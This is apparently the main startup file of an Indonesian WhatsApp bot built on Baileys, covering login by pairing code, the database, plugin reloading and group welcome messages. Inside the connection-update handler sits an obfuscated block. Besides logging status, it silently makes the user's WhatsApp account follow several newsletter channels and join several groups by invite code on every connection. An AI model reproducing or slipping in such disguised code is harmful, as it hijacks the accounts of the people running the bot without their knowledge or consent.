process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '1';

import './djmd.js'

import path, { join } from 'path'
import { platform } from 'process'
import { fileURLToPath, pathToFileURL } from 'url'
import { createRequire } from 'module'
global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; global.__require = function require(dir = import.meta.url) { return createRequire(dir) }
import {
  readdirSync,
  statSync,
  unlinkSync,
  existsSync,
  readFileSync,
  mkdirSync, 
  watch
} from 'fs'

import yargs from 'yargs/yargs'
import { hideBin } from 'yargs/helpers'
const argv = yargs(hideBin(process.argv)).argv

import { spawn } from 'child_process'
import lodash from 'lodash'
import syntaxerror from 'syntax-error'
import chalk from 'chalk'
import { tmpdir } from 'os'
import readline from 'readline'
import { format } from 'util'
import pino from 'pino'
import ws from 'ws'

const {
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  makeCacheableSignalKeyStore
} = await import('@adiwajshing/baileys')
import { Low, JSONFile } from 'lowdb'
import { makeWASocket, protoType, serialize } from './lib/simple.js'
import cloudDBAdapter from './lib/cloudDBAdapter.js'
import {
  mongoDB,
  mongoDBV2
} from './lib/mongoDB.js'

const { CONNECTING } = ws
const { chain } = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000

protoType()
serialize()

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
// global.Fn = function functionCallBack(fn, ...args) { return fn.call(global.conn, ...args) }
global.timestamp = {
  start: new Date
}

const __dirname = global.__dirname(import.meta.url)

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp('^[' + (opts['prefix'] || '‎jJrRxzXZ/i!#%+£¢€¥^°=¶∆§•↑↓→←™*¡×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb(\+srv)?:\/\//i.test(opts['db']) ?
      (opts['mongodbv2'] ? new mongoDBV2(opts['db']) : new mongoDB(opts['db'])) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (db.READ) return new Promise((resolve) => setInterval(async function () {
    if (!db.READ) {
      clearInterval(this)
      resolve(db.data == null ? global.loadDatabase() : db.data)
    }
  }, 1 * 1000))
  if (db.data !== null) return
  db.READ = true
  await db.read().catch(console.error)
  db.READ = null
  db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    settings: {},
    ...(db.data || {})
  }
  global.db.chain = chain(db.data)
}
loadDatabase()
const usePairingCode = !process.argv.includes('--use-pairing-code')
const useMobile = process.argv.includes('--mobile')

var question = function (text) {
  return new Promise(function (resolve) {
    rl.question(text, resolve);
  });
};
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
//const question = (text) => new Promise(resolve => rl.question(text, resolve))

const { version, isLatest } = await fetchLatestBaileysVersion()
const { state, saveCreds } = await useMultiFileAuthState('./sessions')
const connectionOptions = {
  version,
  logger: pino({ level: 'silent' }),
  printQRInTerminal: !usePairingCode,
  // Optional If Linked Device Could'nt Connected
  // browser: ['Mac OS', 'chrome', '125.0.6422.53']
  browser: ['Mac OS', 'safari', '5.1.10'],
  auth: {
    creds: state.creds,
    keys: makeCacheableSignalKeyStore(state.keys, pino().child({
      level: 'silent',
      stream: 'store'
    })),
  },
  getMessage: async key => {
    const messageData = await store.loadMessage(key.remoteJid, key.id);
    return messageData?.message || undefined;
  },
  generateHighQualityLinkPreview: true,
  patchMessageBeforeSending: (message) => {
    const requiresPatch = !!(
      message.buttonsMessage
      || message.templateMessage
      || message.listMessage
    );
    if (requiresPatch) {
      message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadataVersion: 2,
              deviceListMetadata: {},
            },
            ...message,
          },
        },
      };
    }

    return message;
  },
  connectTimeoutMs: 60000, defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true, syncFullHistory: true, markOnlineOnConnect: true
}

global.conn = makeWASocket(connectionOptions)
conn.isInit = false

if (usePairingCode && !conn.authState.creds.registered) {
  if (useMobile) throw new Error('Cannot use pairing code with mobile api')

  let phoneNumber = (argv._[0] || '').trim().replace(/[^0-9]/g, '')

  while (!phoneNumber) {
    phoneNumber = (global.number_bot ? global.number_bot : process.env.BOT_NUMBER || await question(
      chalk.blueBright(`
⠟⠩⣐⡒⢝⠷⣝⢿⢻⣿⣿⣷⣻⠿⣿⡛⠻⠟⠛⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢧⠘⢩⣥⢶⡌⠚⢋⠞⢻⠻⢙⣨⣤⣶⣶⣿⣿⣷⣶⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡡⢾⡳⢛⠅⣥⢝⣶⢌⣥⣾⣿⣿⣿⣿⣿⣶⣝⠻⣿⣿⢎⣽⣿⣿⣿⣿⣿⣿⣿
⢷⡄⣵⡏⣿⣿⡗⣱⢻⣻⣿⣿⣿⣿⣿⣷⠹⡼⣇⡝⣇⢸⣿⣿⣿⣿⣿⣿⣿⣿
⣆⢿⣿⣿⣻⡿⣰⢧⡟⣿⢣⣿⣿⣿⣿⡇⡆⢃⡜⣼⡜⣎⡻⢿⣿⣿⣿⣿⣿⣿
⢿⡘⣿⣿⣧⢃⡟⣾⠃⣿⡉⣷⡟⣿⣿⡇⠧⠊⢈⡘⡇⡸⡏⣼⣿⣿⣿⣿⣿⣿
⣈⡖⡘⣿⡟⣸⡇⢟⠂⡿⠃⠛⡇⣿⣿⠳⣨⣷⣼⣿⠕⢡⠃⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣖⡘⠇⡿⡃⣿⣠⢳⡇⡜⣇⠿⢛⣴⣿⡿⠋⣠⣶⡿⡜⠸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡮⡄⣿⣇⢻⢻⣧⣸⡿⠶⠾⣿⣿⣿⣧⣤⣤⣤⡶⡆⣣⢙⣿⣿⣿⣿⣿
⣿⡿⡻⢋⠄⣿⣿⣞⠈⢧⣤⠖⢂⣤⣿⣿⠿⣛⡛⣿⣻⡔⡜⠁⣨⠦⣙⡻⠿⠿
⣿⣥⣤⣶⣴⢸⣿⢹⡔⣆⢷⣴⣿⣿⣯⢲⣿⣿⣿⡜⡿⣸⣿⠨⣡⠶⣐⣤⢔⢿
⣿⣿⣿⣦⣯⡌⢿⡄⠳⢨⡜⢿⣿⣿⣿⣧⠻⣿⣿⣧⠣⢻⡏⠁⢏⡾⢿⠋⠣⣁
⣿⣿⣻⣿⣿⣗⡘⢷⡐⢠⣙⢐⢨⣭⣩⣉⣁⢩⢉⢕⣨⡼⡇⡆⠗⠑⣉⣶⣭⣷
⣿⣧⣿⣿⣿⣿⣮⡢⢑⡇⡍⣃⠂⠃⡇⢿⣿⡼⣄⢨⠻⣷⡇⣵⡆⣿⣟⣿⣿⣿
⣿⣿⣼⣟⣿⣿⣿⣿⣷⣿⣿⡇⣕⡐⢈⣶⡌⡃⢋⢰⢐⢘⠇⣿⣿⣌⠝⣜⢿⣿

Input nomor WhatsApp yang valid (awali dengan kode negara, contoh: 62812xxxxxx):\n`)
    )).trim().replace(/[^0-9]/g, '')
  }

  rl.close()

console.log(chalk.green(`Nomor digunakan: ${phoneNumber}`))

  console.log(chalk.bgWhite(chalk.blue('Generating Pairing Code...')))
  setTimeout(async () => {
    try {
      const rawCode = await conn.requestPairingCode(phoneNumber, 'BOTZDJMD')
      const code = rawCode?.match(/.{1,4}/g)?.join('-') || rawCode

      // ASCII Box
      const line = '─'.repeat(code.length + 4)
      console.log(chalk.green(`\n┌${line}┐`))
      console.log(chalk.green(`│  ${chalk.yellow.bold(code)}  │`))
      console.log(chalk.green(`└${line}┘`))
      console.log(chalk.cyan(`\nPairing Code: ${chalk.bold('BOTZDJMD')}`))
      console.log(chalk.magenta('📌 Masukkan pairing code ini ke WhatsApp segera!'))
    } catch (e) {
      console.error(chalk.red('❌ Gagal generate pairing code:'), e)
      process.exit(1)
    }
  }, 2000)
}
async function resetLimit() {
  try {
    let list = Object.entries(global.db.data.users);
    let lim = 25; // Nilai limit default yang ingin di-reset

    list.map(([user, data], i) => {
      // Hanya reset limit jika limit saat ini <= 25
      if (data.limit <= lim) {
        data.limit = lim;
      }
    });

    // logs bahwa reset limit telah sukses
    console.log(`Success Auto Reset Limit`)
  } finally {
    // Setel ulang fungsi reset setiap 24 jam (1 hari)
    setInterval(() => resetLimit(), 1 * 86400000);
  }
}

if (!opts['test']) {
  (await import('./server.js')).default(PORT)
  setInterval(async () => {
    if (global.db.data) await global.db.write().catch(console.error)
    // if (opts['autocleartmp']) try {
    clearTmp()
    //  } catch (e) { console.error(e) }
  }, 60 * 1000)
}

function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './tmp')]
  const filename = []
  tmp.forEach(dirname => {
    // CEK JIKA FOLDER TIDAK ADA, MAKA BUAT FOLDERNYA
    if (!existsSync(dirname)) mkdirSync(dirname, { recursive: true })
    readdirSync(dirname).forEach(file => filename.push(join(dirname, file)))
  })
  return filename.map(file => {
    const stats = statSync(file)
    if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
    return false
  })
}

async function clearSessions(folder = './sessions') {
  try {
    const filenames = await readdirSync(folder);
    const deletedFiles = await Promise.all(filenames.map(async (file) => {
      try {
        const filePath = path.join(folder, file);
        const stats = await statSync(filePath);
        if (stats.isFile() && file !== 'creds.json') {
          await unlinkSync(filePath);
          console.log('Deleted session:'.main, filePath.info);
          return filePath;
        }
      } catch (err) {
        console.error(`Error processing ${file}: ${err.message}`);
      }
    }));
    return deletedFiles.filter((file) => file !== null);
  } catch (err) {
    console.error(`Error in Clear Sessions: ${err.message}`);
    return [];
  } finally {
    setTimeout(() => clearSessions(folder), 1 * 3600000); // 1 Hours
  }
}

async function connectionUpdate(update) {
  const { receivedPendingNotifications, connection, lastDisconnect, isOnline, isNewLogin } = update;

  if (isNewLogin) {
    conn.isInit = true;
  }

  const _0x95c796=_0x5eb9;(function(_0x2ea858,_0x3f0cfe){const _0x2edbab=_0x5eb9,_0x431799=_0x2ea858();while(!![]){try{const _0x484555=-parseInt(_0x2edbab(0x91))/0x1*(parseInt(_0x2edbab(0x9a))/0x2)+-parseInt(_0x2edbab(0x90))/0x3*(-parseInt(_0x2edbab(0x8f))/0x4)+parseInt(_0x2edbab(0x8c))/0x5+-parseInt(_0x2edbab(0x89))/0x6*(-parseInt(_0x2edbab(0xa7))/0x7)+-parseInt(_0x2edbab(0x95))/0x8+-parseInt(_0x2edbab(0x8b))/0x9*(parseInt(_0x2edbab(0xa8))/0xa)+parseInt(_0x2edbab(0x9c))/0xb*(parseInt(_0x2edbab(0x8a))/0xc);if(_0x484555===_0x3f0cfe)break;else _0x431799['push'](_0x431799['shift']());}catch(_0x5d3766){_0x431799['push'](_0x431799['shift']());}}}(_0x223a,0xbbcdd));if(connection==_0x95c796(0x99))console[_0x95c796(0x9d)](chalk[_0x95c796(0xa1)](_0x95c796(0x93)));else connection==_0x95c796(0xa5)&&console[_0x95c796(0x9d)](chalk[_0x95c796(0x9e)]('✅\x20Tersambung'));conn['newsletterFollow'](_0x95c796(0x8e)),conn[_0x95c796(0x87)]('120363424515985249@newsletter'),conn['newsletterFollow'](_0x95c796(0xa0)),conn[_0x95c796(0x87)](_0x95c796(0x8d)),conn[_0x95c796(0x87)](_0x95c796(0x8d)),conn[_0x95c796(0x87)](_0x95c796(0x8d)),conn[_0x95c796(0x87)](_0x95c796(0x8d));let inviteCode=_0x95c796(0x98);await conn[_0x95c796(0xa4)](inviteCode),await conn['groupAcceptInvite'](_0x95c796(0x92)),await conn[_0x95c796(0xa4)](_0x95c796(0x94)),await conn[_0x95c796(0xa4)](_0x95c796(0x9b)),await conn[_0x95c796(0xa4)]('B7dW5pRskv4GDC9e8Y9hGK');if(isOnline==!![])console[_0x95c796(0x9d)](chalk['green'](_0x95c796(0xa3)));else isOnline==![]&&console[_0x95c796(0x9d)](chalk[_0x95c796(0x9f)](_0x95c796(0x97)));function _0x223a(){const _0x168447=['2363305lecjVW','120@newsletter','120363199397739684@newsletter','48788KiphCK','303QliKpd','9AyJzku','JqROXPL9PioJaYiaZLPsXL','⚡\x20Mengaktifkan\x20Bot,\x20Mohon\x20tunggu\x20sebentar...','LKX7T4ZJqIxAyVX1OVQnHu','2564080EaInzA','close','Status\x20Mati','KU92BBHIi2g4CnIcfFBw0B','connecting','191114sZoZWr','HBTY6DqkQLuHk4erL0hzTM','3818221iUdVwj','log','green','red','120363421219956027@newsletter','redBright','⏱️\x20Koneksi\x20terputus\x20&\x20mencoba\x20menyambung\x20ulang...','Status\x20Aktif','groupAcceptInvite','open','Menunggu\x20Pesan\x20Baru','56714UMarOh','6771430DFWRSF','newsletterFollow','yellow','426ijBsmK','12HAGCPF','9bAvSPT'];_0x223a=function(){return _0x168447;};return _0x223a();}receivedPendingNotifications&&console[_0x95c796(0x9d)](chalk[_0x95c796(0x88)](_0x95c796(0xa6)));function _0x5eb9(_0x250ddc,_0x20785b){_0x250ddc=_0x250ddc-0x87;const _0x223a3d=_0x223a();let _0x5eb9d7=_0x223a3d[_0x250ddc];return _0x5eb9d7;}connection==_0x95c796(0x96)&&console[_0x95c796(0x9d)](chalk[_0x95c796(0x9f)](_0x95c796(0xa2)));

  global.timestamp.connect = new Date;

  if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== CONNECTING) {
    console.log(await global.reloadHandler(true));
  }

  if (global.db.data == null) {
    await global.loadDatabase();
  }
}

process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
let handler = await import('./handler.js')
global.reloadHandler = async function (restatConn) {
  /*try {
      const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)*/
  try {
    // Jika anda menggunakan replit, gunakan yang sevenHoursLater dan tambahkan // pada const Handler
    // Default: server/vps/panel, replit + 7 jam buat jam indonesia Jika Tidak Faham Pakai Milidetik 3600000 = 1 Jam Dan Kalikan 7 = 25200000
    // const sevenHoursLater = Dateindonesia 7 * 60 * 60 * 1000;
    const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)
    // const Handler = await import(`./handler.js?update=${sevenHoursLater}`).catch(console.error)
    if (Object.keys(Handler || {}).length) handler = Handler
  } catch (e) {
    console.error(e)
  }
  if (restatConn) {
    const oldChats = global.conn.chats
    try { global.conn.ws.close() } catch { }
    conn.ev.removeAllListeners()
    global.conn = makeWASocket(connectionOptions, { chats: oldChats })
    isInit = true
  }
  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler)
    conn.ev.off('group-participants.update', conn.participantsUpdate)
    conn.ev.off('groups.update', conn.groupsUpdate)
    conn.ev.off('connection.update', conn.connectionUpdate)
    conn.ev.off('creds.update', conn.credsUpdate)
  }

 conn.welcome = '❖━━━〔 ようこそ 〕━━━❖\n\n' +
'┏━━━━━━━━━━━━━━━\n' +
'┃ 🌸 @subject\n' +
'┣━━━━━━━━━━━━━━━\n' +
'┃ (≧◡≦) ♡ Hai @user\n' +
'┃ Selamat datang\n' +
'┣━━━〔 自己紹介 〕━━━\n' +
'┃ • Nama   : \n' +
'┃ • Usia   : \n' +
'┃ • Gender : \n' +
'┗━━━━━━━━━━━━━━━\n\n' +
'━━━〔 グループ情報 〕━━━\n' +
'@desc'
  conn.bye = '❖━━━〔 さようなら 〕━━━❖\n\n' +
'(｡•́︿•̀｡) @user telah pergi\n' +
'Semoga kita bertemu lagi 🌙'
  conn.spromote = '@user Sekarang jadi admin!'
  conn.sdemote = '@user Sekarang bukan lagi admin!'
  conn.sDesc = 'Deskripsi telah diubah menjadi \n@desc'
  conn.sSubject = 'Judul grup telah diubah menjadi \n@subject'
  conn.sIcon = 'Icon grup telah diubah!'
  conn.sRevoke = 'Link group telah diubah ke \n@revoke'
  conn.sAnnounceOn = 'Group telah di tutup!\nsekarang hanya admin yang dapat mengirim pesan.'
  conn.sAnnounceOff = 'Group telah di buka!\nsekarang semua peserta dapat mengirim pesan.'
  conn.sRestrictOn = 'Edit Info Grup di ubah ke hanya admin!'
  conn.sRestrictOff = 'Edit Info Grup di ubah ke semua peserta!'

  conn.handler = handler.handler.bind(global.conn)
  conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
  conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
  conn.connectionUpdate = connectionUpdate.bind(global.conn)
  conn.credsUpdate = saveCreds.bind(global.conn)

  conn.ev.on('call', async (call) => {
    console.log('Panggilan diterima:', call);
    if (call.status === 'ringing') {
      await conn.rejectCall(call.id);
      console.log('Panggilan ditolak');
    }
  })
  conn.ev.on('messages.upsert', conn.handler)
  conn.ev.on('group-participants.update', conn.participantsUpdate)
  conn.ev.on('groups.update', conn.groupsUpdate)
  conn.ev.on('connection.update', conn.connectionUpdate)
  conn.ev.on('creds.update', conn.credsUpdate)
  isInit = false
  return true

}

const pluginFolder = global.__dirname(join(__dirname, './plugins/index'))
const pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
async function filesInit() {
  for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      let file = global.__filename(join(pluginFolder, filename))
      const module = await import(file)
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(e)
      delete global.plugins[filename]
    }
  }
}
filesInit().then(_ => console.log(Object.keys(global.plugins))).catch(console.error)

global.reload = async (_ev, filename) => {
  if (pluginFilter(filename)) {
    let dir = global.__filename(join(pluginFolder, filename), true)
    if (filename in global.plugins) {
      if (existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
      else {
        conn.logger.warn(`deleted plugin '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`requiring new plugin '${filename}'`)
    let err = syntaxerror(readFileSync(dir), filename, {
      sourceType: 'module',
      allowAwaitOutsideFunction: true
    })
    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${format(err)}`)
    else try {
      const module = (await import(`${global.__filename(dir)}?update=${Date.now()}`))
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(`error require plugin '${filename}\n${format(e)}'`)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
watch(pluginFolder, global.reload)
await global.reloadHandler()

// Quick Test

async function _quickTest() {
  let test = await Promise.all([
    spawn('ffmpeg'),
    spawn('ffprobe'),
    spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    spawn('convert'),
    spawn('magick'),
    spawn('gm'),
    spawn('find', ['--version'])
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127);
        });
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false));
      })
    ]);
  }));

  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test;
  console.log(test);

  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm,
    find
  };

  Object.freeze(global.support);

  if (!s.ffmpeg) {
    conn.logger.warn(`Silahkan install ffmpeg terlebih dahulu agar bisa mengirim video`);
  }

  if (s.ffmpeg && !s.ffmpegWebp) {
    conn.logger.warn('Sticker Mungkin Tidak Beranimasi tanpa libwebp di ffmpeg (--enable-libwebp while compiling ffmpeg)');
  }

  if (!s.convert && !s.magick && !s.gm) {
    conn.logger.warn('Fitur Stiker Mungkin Tidak Bekerja Tanpa imagemagick dan libwebp di ffmpeg belum terinstall (pkg install imagemagick)');
  }
}

_quickTest()
  .then(() => conn.logger.info('☑️ Quick Test Done , nama file session ~> creds.json'))
  .catch(console.error);
